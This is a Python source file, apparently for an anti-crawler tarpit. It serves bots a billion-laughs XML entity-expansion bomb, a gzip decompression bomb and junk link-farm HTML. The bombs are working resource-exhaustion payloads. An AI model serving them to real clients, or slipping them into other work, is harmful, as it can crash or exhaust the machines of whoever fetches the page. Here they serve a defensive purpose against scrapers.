from replacer import replacerFile
import filedb

import gzip

import random,time
from array import array
import os
oj = os.path.join

class HeadWithBody:
    dead = False
    def __init__(self,b):
        self.b = memoryview(b)
        self.len = len(b)
    def lose(self):
        self.dead = True
        self.b = None
    def get(self,s,e):
        if self.dead or s > self.len:
            return None
        return self.b[s:e]

def joinheaders(headers):
    return ('\r\n'.join(n+': '+v for n,v in headers)).encode('utf-8')

class Maker:
    headers = (
        ('Content-Type','text/html; charset=utf-8'),
        ('Server','Apache'),
    )
    
    def __init__(self):
        headers = list(self.headers)
        random.shuffle(headers)
        splitit = int(len(headers) / 2)
        self.prehead = b'HTTP/1.1 200 OK' + joinheaders(
            headers[:splitit]+[('Date','')])
        self.posthead = joinheaders(headers[splitit:] + [('Content-Length','')])
    def generate(self,date):
        head = self.prehead + date.encode() + self.posthead
        body = self.body()
        return(
            self.name,
            head + b'0\r\n\r\n',
            HeadWithBody(head + str(len(body)).encode() + b'\r\n\r\n' + body))
        
class BillionLaughs(Maker):
    name = "billion laughs"
    prefix = ''.join(random.sample('lolzaoeuwhatatweest',4)).encode('utf-8')

    def body(self):
        return '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE {p}z [
 <!ENTITY {p} "{p}">
 <!ELEMENT {p}z (#PCDATA)>
 <!ENTITY {p}1 "&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};">
 <!ENTITY {p}2 "&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;">
 <!ENTITY {p}3 "&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;">
 <!ENTITY {p}4 "&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;">
 <!ENTITY {p}5 "&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;">
 <!ENTITY {p}6 "&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;">
 <!ENTITY {p}7 "&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;">
 <!ENTITY {p}8 "&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;">
 <!ENTITY {p}9 "&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;">
]>
<{p}z>&{p}9;</{p}z>'''.format(p=self.prefix).encode('utf-8')


class ZipBomb(BillionLaughs):
    name = "zip bomb"

    headers = Maker.headers + (('Content-Encoding','gzip'),)
    
    def body(self):
        try:
            with open(oj(filedb.top,'bomb.gz.bad'),'rb') as inp:
                return inp.read()
        except IOError: pass
        
        prefix = super().body()
        stuff = bytes([0])*10000000
        with replacerFile(oj(filedb.top,'bomb.gz.bad')) as out:
            g = gzip.GzipFile(mode='w',fileobj=out)
            g.write(prefix)
            for i in range(1000):
                print('stripe',i)
                g.write(stuff)
            g.close()
        return self.body()

class Dorp(Maker):
    name="dorp"
    def dorp(self,a):
        # this is the part that needs to be arrayified
        # should be printable, biased towards low, but above 32
        a.extend(
            chr(int(random.random()**3*10000+32)) \
            for i in range(random.randint(100,200)))
    def body(self):
        a = array('u')
        # arrayifying this shaves off a whole 3ms :p
        a.extend('<!DOCTYPE html><html><head><title>')
        self.dorp(a)
        a.extend('''</title></head>'
        <body><p>''')
        for link in range(random.randint(100,200)):
            if random.randrange(0,2)==0:
                a.extend("</p><p>")
            if random.randrange(0,10)==0:
                a.extend("<hr/>")
            if random.randrange(0,6):
                a.extend('\n')
            a.extend('<a href="/art/')
            self.dorp(a)
            a.extend('/secrets.html">')
            self.dorp(a)
            a.extend('</a>\n')
        a.extend('</p></body></html>')
        return a.tounicode().encode('utf-8')

dorp = Dorp()
billionLaughs = BillionLaughs()
zipbomb = ZipBomb()
    
class BotHelper:
    lastBot = None
    messages = ()
    def select(self,date,ip):
        if self.lastBot is None or time.time() - self.lastBot < 100:
            for message in self.messages:
                message[2].lose() # delayed senders can now give up here
            self.messages = [dorp.generate(date) for i in range(0x2)]
            # self.messages = []
            self.messages.append(billionLaughs.generate(date))
            self.messages.append(zipbomb.generate(date))
            self.lastBot = time.time()
        return random.sample(self.messages,1)[0]

def stresstest():
    "test Dorp"
    print('started at',time.time())
        
    start = time.time()
    for i in range(0x20):
        dorp.generate('sometime')
    end = time.time()
    print('generated in',end-start)
    # this will take up 1% of the computer's brain time:
    print('recommended generation interval is ',int(100*(end-start)))

if __name__ == '__main__':
    stresstest()
else:
    import sys
    sys.modules[__name__] = BotHelper()
